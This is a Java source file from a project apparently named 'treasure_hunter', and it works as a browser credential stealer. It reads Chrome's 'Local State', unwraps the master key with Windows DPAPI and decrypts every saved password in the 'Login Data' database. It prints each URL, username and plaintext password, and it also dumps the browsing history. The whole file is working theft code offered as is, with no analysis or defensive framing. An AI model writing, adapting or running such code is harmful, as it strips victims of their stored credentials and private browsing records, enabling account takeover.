package com.treasure_hunter_java;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.spec.KeySpec;
import java.sql.*;
import java.util.Arrays;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;
import org.apache.commons.codec.binary.Hex;
//import org.bouncycastle.util.encoders.Hex;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.sqlite.SQLiteConnection;


public class Decrypt {

    private static final String CHROME_LOGIN_DATA_PATH = String.valueOf(Path.of(Main.mainWorkDirectory + "/Login Data"));
    private static final String LOCAL_STATE_PATH = String.valueOf(Path.of(Main.mainWorkDirectory + "/Local State"));
    private static final String HISTORY_PATH = String.valueOf(Path.of(Main.mainWorkDirectory + "/History"));

    public static byte[] getMasterKey(String directory) throws Exception {
        Path localStateFile = Path.of(directory + "/Local State");

        String localState = Files.readString(localStateFile, StandardCharsets.UTF_8);

        String masterKeyB64 = null;

        Pattern pattern = Pattern.compile("\"encrypted_key\":\"([^\"]+)\"");

        Matcher matcher = pattern.matcher(localState);

        if (matcher.find()) {
            masterKeyB64 = matcher.group(1);
        }
        byte[] masterKeyEnc = Base64.getDecoder().decode(masterKeyB64.getBytes(StandardCharsets.UTF_8));

        return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKeyEnc, 5, masterKeyEnc.length));
    }

    private static final int GCM_TAG_LENGTH = 128;
    private static final int IV_LENGTH = 12;

    public static String decryptPassword(byte[] passwordBytes, byte[] masterKey) throws Exception {
        byte[] iv = Arrays.copyOfRange(passwordBytes, 3, IV_LENGTH + 3);
        byte[] ciphertext = Arrays.copyOfRange(passwordBytes, IV_LENGTH + 3, passwordBytes.length);
        byte[] aad = Arrays.copyOfRange(passwordBytes, 0, 3);

        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);
        //cipher.updateAAD(aad);
        byte[] decryptedPasswordBytes = cipher.doFinal(ciphertext);
        return new String(decryptedPasswordBytes, StandardCharsets.UTF_8);
    }

    public static String decryptPasswords(String directory) throws Exception {
        String text = "URL | LOGIN | PASSWORD\n";
        File dbFile = new File(directory + "/Login Data");
        System.out.println(dbFile.getAbsolutePath());
        Connection conn = null;
        try {
            conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins");

            byte[] masterKey = getMasterKey(directory);

            while (rs.next()) {
                byte[] passwordBytes = rs.getBytes("password_value");
                String decryptedPassword = decryptPassword(passwordBytes, masterKey);
                String url = rs.getString("action_url");
                String login = rs.getString("username_value");
                if (!decryptedPassword.equals("")) {
                    text += url + " | " + login + " | " + decryptedPassword + "\n";
                }
            }
            rs.close();
            stmt.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                if (conn != null) {
                    conn.close();
                }
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return text;

    }

    public static String getHistory(){
        String text = "" + "\n";
        File dbFile = new File(HISTORY_PATH);
        Connection conn = null;
        try {
            Class.forName("org.sqlite.JDBC");
            conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT id, url, title FROM urls");
            while (rs.next()) {
                int id = rs.getInt("id");
                String url = rs.getString("url");
                String title = rs.getString("title");
                text += "ID: " + id + " | URL: " + url + " | Title: " + title + "\n";
            }
        } catch (ClassNotFoundException | SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                if (conn != null) {
                    conn.close();
                }
            } catch (SQLException ex) {
                ex.printStackTrace();
            }
        }
        return text;

    }
}